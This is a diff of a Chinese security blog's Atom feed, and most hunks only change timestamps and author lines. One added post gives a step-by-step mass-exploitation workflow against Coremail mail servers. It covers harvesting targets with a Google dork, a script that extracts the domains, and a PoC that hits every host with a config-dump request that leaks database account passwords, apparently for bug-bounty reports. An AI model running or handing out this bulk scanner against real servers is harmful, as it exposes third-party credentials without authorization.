@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>http://www.svenbeast.com/</id>
     <title>Sven&apos;blog</title>
-    <updated>2019-07-19T02:06:30.689Z</updated>
+    <updated>2019-07-19T02:35:49.551Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="http://www.svenbeast.com/"/>
     <link rel="self" href="http://www.svenbeast.com//atom.xml"/>
@@ -80,7 +80,7 @@
 <li>至文章编辑日2019年7月16日并无官方补丁</li>
 <li>关注：https://bitbucket.org/vot/discuz.ml/commits/all等待补丁</li>
 </ul>
-<h3 id="ps如果有说的不对的可以留言马上修正-">PS：如果有说的不对的，可以留言，马上修正 -.- !</h3>
+<h3 id="ps因博客重建特意将本人文章从tools转移回来如有影响可联系删帖">PS：因博客重建，特意将本人文章从Tools转移回来，如有影响，可联系删帖</h3>
 ]]></content>
     </entry>
     <entry>
@@ -96,7 +96,7 @@
 <p>usage：python2 fofa.py</p>
 <pre><code>#coding=utf-8
 #python2
-#By 斯文禽兽
+#By sven'beast
 
 import sys
 import requests
@@ -129,7 +129,7 @@ with open('1.html','r') as f:
 <p>usage：python3 poc.py</p>
 <pre><code>#!/usr/bin/env python3
 #-*- encoding:utf-8 -*-
-#By 斯文禽兽
+#By sven'beast
 
 import base64
 import requests
@@ -177,6 +177,82 @@ for x in range(th_num):
 <p>代码已经提供了，可以自己复制，同时也分享了百度云和附件</p>
 <p>链接: https://pan.baidu.com/s/1xfcxfk16PanOtjUBJmKdxQ 提取码: xrrq<br>
 解压密码：svenbeast</p>
+<h3 id="ps因博客重建特意将本人文章从tools转移回来如有影响可联系删帖">PS：因博客重建，特意将本人文章从Tools转移回来，如有影响，可联系删帖</h3>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[coremail批量刷src]]></title>
+        <id>http://www.svenbeast.com//post/coremail-pi-liang-shua-src</id>
+        <link href="http://www.svenbeast.com//post/coremail-pi-liang-shua-src">
+        </link>
+        <updated>2019-06-16T16:33:05.000Z</updated>
+        <content type="html"><![CDATA[<ul>
+<li>用来小批量刷src的洞是hw这几天曝出的coremail的信息泄露漏洞，量级够，所以可堪一战</li>
+<li>在此对写coremail的POC的作者表示感谢la -.-!</li>
+</ul>
+<h3 id="首先步骤1利用google语法列出搜索结果并保存网页">首先步骤1：利用google语法列出搜索结果并保存网页#</h3>
+<p>这里图片里的google语法是 inurl:coremail（其他语法需自行构造，最好加上中文关键字），然后翻到第2页，ctrl+s将页面保存为1.html<br>
+ps：拥有ZoomEye，Fofa，shodan账号的略过即可 -.-</p>
+<p><img src="http://www.svenbeast.com//post-images/1563502445782.png" alt=""></p>
+<h3 id="步骤2获取html文件中的coremaile域名">步骤2：获取html文件中的coremaile域名#</h3>
+<p>usage：python2 damain.py</p>
+<pre><code>#coding=utf-8
+import sys
+import requests
+from lxml import etree
+
+
+# def check_url(url):
+
+with open('1.html','r') as f:
+    text=f.read()
+    html = etree.HTML(text)
+    results = html.xpath('//*[@id=&quot;rso&quot;]/div[1]/div/div/div/div/div/a')
+    with open('ip.txt','a') as s:
+        for i in results:
+            print i.get('href').split('/')[2]
+            url=i.get('href').split('/')[2]
+            s.write('http://'+url)
+            s.write('\n')
+</code></pre>
+<p><img src="http://www.svenbeast.com//post-images/1563502540703.png" alt=""></p>
+<p>会在当前目录下生成ip.txt</p>
+<p>Ps：记得把生成的ip.txt文件中google.com后缀的网站删掉，这个是google翻译，不删掉有些浪费检测时间，毕竟是单线程，hh。<br>
+步骤3：批量验证漏洞#<br>
+usage：python2 poc.py</p>
+<pre><code>#-*- Coding: utf-8 -*-
+
+import requests,sys
+
+
+def mailsmsPoC(url):
+    url = url + &quot;/mailsms/s?func=ADMIN:appState&amp;dumpConfig=/&quot;
+    try:
+        r = requests.get(url,timeout=8000)
+        if (r.status_code != '404') and (&quot;/home/coremail&quot; in r.text):
+            print &quot;mailsms is vulnerable: {0}&quot;.format(url)
+            with open('vul.txt', 'a') as f:
+                    f.write(url + '\n')
+        else:
+            print &quot;mailsms is safe!&quot;
+    except Exception as e:
+        print &quot;######time out######&quot;
+if __name__ == '__main__':
+    try:
+        mailsmsPoC(sys.argv[1])
+    except:
+        print &quot;python poc.py&quot;
+
+file = open('ip.txt', 'r')
+for f in file.readlines():
+    url = f.strip('\r\n')
+    mailsmsPoC(url)
+</code></pre>
+<p><img src="http://www.svenbeast.com//post-images/1563502552598.png" alt=""></p>
+<p>步骤4：存在漏洞的会在当前目录下生成vul.txt，直接复制url粘贴到网页上，ctr+f搜索database就可以看到数据库的账号密码一些信息了,就可以开始截图进行src提交了#<br>
+<img src="http://www.svenbeast.com//post-images/1563502558364.png" alt=""></p>
+<p>结束：获取域名时，后得到的域名是编辑进ip.txt文件的，所以不必担心多次获取域名后替换前面已获取的。</p>
+<h3 id="ps因博客重建特意将本人文章从圈子转移回来如有影响可联系删帖">PS：因博客重建，特意将本人文章从圈子转移回来，如有影响，可联系删帖</h3>
 ]]></content>
     </entry>
     <entry>
@@ -241,6 +317,7 @@ for x in range(th_num):
 <p>如果PHP的配置选项allow_url_include为ON的话，则include/require函数可以加载远程文件，这种漏洞被称为&quot;远程文件包含漏洞(Remote File Inclusion RFI)&quot;。</p>
 <p>allow_url_fopen = On 是否允许打开远程文件</p>
 <p>allow_url_include = On 是否允许include/require远程文件</p>
+<h3 id="ps因博客重建特意将本人文章从tools转移回来如有影响可联系删帖">PS：因博客重建，特意将本人文章从Tools转移回来，如有影响，可联系删帖</h3>
 ]]></content>
     </entry>
 </feed>
